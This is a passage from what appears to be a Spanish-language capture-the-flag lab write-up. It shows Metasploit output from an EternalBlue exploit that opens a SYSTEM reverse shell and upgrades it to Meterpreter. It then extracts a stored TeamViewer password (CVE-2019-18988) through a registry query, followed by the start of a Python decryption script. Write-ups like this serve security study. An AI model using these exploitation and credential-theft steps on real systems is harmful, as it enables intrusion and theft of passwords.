&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.219.23:445 - 0x00000020  &lt;span class=&#34;m&#34;&gt;69&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;63&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;65&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;50&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;61&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;63&lt;/span&gt; 6b &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt;                    ice Pack &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;      
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.219.23:445 - Target arch selected valid &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; arch indicated by DCE/RPC reply
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.219.23:445 - Trying exploit with &lt;span class=&#34;m&#34;&gt;12&lt;/span&gt; Groom Allocations.
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.219.23:445 - Sending all but last fragment of exploit packet
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.219.23:445 - Starting non-paged pool grooming
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.219.23:445 - Sending SMBv2 buffers
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.219.23:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.219.23:445 - Sending final SMBv2 buffers.
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.219.23:445 - Sending last fragment of exploit packet!
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.219.23:445 - Receiving response from exploit packet
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.219.23:445 - ETERNALBLUE overwrite completed successfully &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0xC000000D&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;!
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.219.23:445 - Sending egg to corrupted connection.
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.219.23:445 - Triggering free of corrupted buffer.
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Command shell session &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; opened &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.8.1.72:4444 -&amp;gt; 10.10.219.23:49189&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2020-02-11 18:35:42 -0600
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.219.23:445 - &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.219.23:445 - &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-WIN-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.219.23:445 - &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;


Copyright &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2009&lt;/span&gt; Microsoft Corporation.  All rights reserved.

C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ystem32&amp;gt;whoami
whoami
nt authority&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ystem

C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ystem32&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Nuestra shell no era meterpreter por lo que utilizamos el modulo de post-explotacion &lt;strong&gt;shell_to_meterpreter&lt;/strong&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msf5 post&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/manage/shell_to_meterpreter&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; show options 

Module options &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;post/multi/manage/shell_to_meterpreter&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Will try to auto detect&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
   LPORT    &lt;span class=&#34;m&#34;&gt;4433&lt;/span&gt;             yes       Port &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; payload to connect to.
   SESSION                   yes       The session to run this module on.

msf5 post&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/manage/shell_to_meterpreter&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; lhost tun0
&lt;span class=&#34;nv&#34;&gt;lhost&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; 10.8.1.72
msf5 post&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/manage/shell_to_meterpreter&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; session &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;session&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
msf5 post&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/manage/shell_to_meterpreter&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; run

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Upgrading session ID: &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Starting exploit/multi/handler
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Started reverse TCP handler on 10.8.1.72:4433 
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Post module execution completed
msf5 post&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/manage/shell_to_meterpreter&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; sessions 

Active &lt;span class=&#34;nv&#34;&gt;sessions&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;===============&lt;/span&gt;

  Id  Name  Type               Information                                                                       Connection
  --  ----  ----               -----------                                                                       ----------
  &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;         shell x64/windows  Microsoft Windows &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Version 6.1.7601&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Copyright &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2009&lt;/span&gt; Microsoft Corporation...  10.8.1.72:4444 -&amp;gt; 10.10.219.23:49193 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.219.23&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

msf5 post&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/manage/shell_to_meterpreter&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; 
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Sending stage &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;180291&lt;/span&gt; bytes&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; to 10.10.219.23
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Meterpreter session &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; opened &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.8.1.72:4433 -&amp;gt; 10.10.219.23:49194&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2020-02-11 18:48:44 -0600
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Stopping exploit/multi/handler

msf5 post&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;multi/manage/shell_to_meterpreter&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; sessions 

Active &lt;span class=&#34;nv&#34;&gt;sessions&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;===============&lt;/span&gt;

  Id  Name  Type                     Information                                                                       Connection
  --  ----  ----                     -----------                                                                       ----------
  &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;         shell x64/windows        Microsoft Windows &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Version 6.1.7601&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Copyright &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2009&lt;/span&gt; Microsoft Corporation...  10.8.1.72:4444 -&amp;gt; 10.10.219.23:49193 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.219.23&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
  &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;         meterpreter x86/windows  NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;YSTEM @ PEPEGAENERGY-01                                             10.8.1.72:4433 -&amp;gt; 10.10.219.23:49194 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.219.23&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;teamviewer---cve-2019-18988&#34;&gt;TeamViewer - CVE-2019-18988&lt;/h2&gt;
&lt;p&gt;Dentro de los procesos que se estan ejecutando en la maquina hay un proceso curioso y es TeamViewer. Buscamos vulnerabilidades recientes y vemos el &lt;code&gt;CVE-2019-18988&lt;/code&gt; en el cual indica que pueden ser extraidos datos utilizando querys en claves de registro, en nuestro caso, utilizamos &lt;code&gt;post/windows/gather/credentials/teamviewer_passwords&lt;/code&gt; de metasploit y logramos obtener la contraseña.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://whynotsecurity.com/blog/teamviewer/&#34;&gt;&lt;strong&gt;TeamViewer - CVE-2019-18988&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Post&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/pepegaenergy/Screenshot_20200211_215738.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Por alguna razon nuestra contraseña no se muestra completa con el modulo de metasploit, se puede hacer manualmente, haciendo un query al registro:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;immy&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&amp;gt;reg query HKEY_LOCAL_MACHINE&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;eamViewer&lt;span class=&#34;se&#34;&gt;\V&lt;/span&gt;ersion7 /v SecurityPasswordAES
reg query HKEY_LOCAL_MACHINE&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;eamViewer&lt;span class=&#34;se&#34;&gt;\V&lt;/span&gt;ersion7 /v SecurityPasswordAES

HKEY_LOCAL_MACHINE&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;eamViewer&lt;span class=&#34;se&#34;&gt;\V&lt;/span&gt;ersion7
    SecurityPasswordAES    REG_BINARY    871C158E545657D6D714B&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... snip ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;594917DD1847A810EFF8C13356


C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;immy&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Luego con un script en python poder desencriptar la conraseña:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;sys&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;hexdump&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;binascii&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;Crypto.Cipher&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;AES&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;AESCipher&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__init__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
        &lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;

    &lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;decrypt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;iv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
